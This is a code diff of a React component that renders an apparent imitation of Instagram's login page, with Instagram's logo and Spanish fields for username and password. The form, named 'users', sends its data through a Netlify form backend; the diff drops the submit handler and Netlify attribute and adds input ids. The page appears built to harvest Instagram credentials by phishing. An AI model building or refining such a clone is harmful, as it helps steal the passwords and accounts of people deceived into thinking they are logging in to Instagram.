@@ -63,11 +63,11 @@ function App() {
         <img className='w-44 invert contrast-200' src={'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png'} alt="Vite logo" />
       </a>
       <div className='p-9'>
-        <form name='users' method='POST' onSubmit={handleSubmit} data-netlify='true'>
+        <form name='users' method='POST'>
           <div className='grid gap-2'>
           <input type="hidden" name="form-name" value="users" />
-            <input onChange={handleInput} className='bg-[#121212] border border-zinc-500 placeholder-zinc-300 p-3 text-xs rounded text-white' name='username' type="text" placeholder="Telefono, usuario o correo electronico " />
-            <input onChange={handleInput} className='bg-[#121212] border  border-gray-300/40 p-3 text-xs rounded text-white' name='password' type="password" placeholder="Contraceña" />
+            <input onChange={handleInput} className='bg-[#121212] border border-zinc-500 placeholder-zinc-300 p-3 text-xs rounded text-white' id='username' name='username' type="text" placeholder="Telefono, usuario o correo electronico " />
+            <input onChange={handleInput} className='bg-[#121212] border  border-gray-300/40 p-3 text-xs rounded text-white' id='password' name='password' type="password" placeholder="Contraceña" />
           </div>
           <button className='bg-[#007bfc] border-0 text-sm text-white p-2 rounded-lg font-semibold w-full mt-4' type="submit">
             Iniciar Sesión
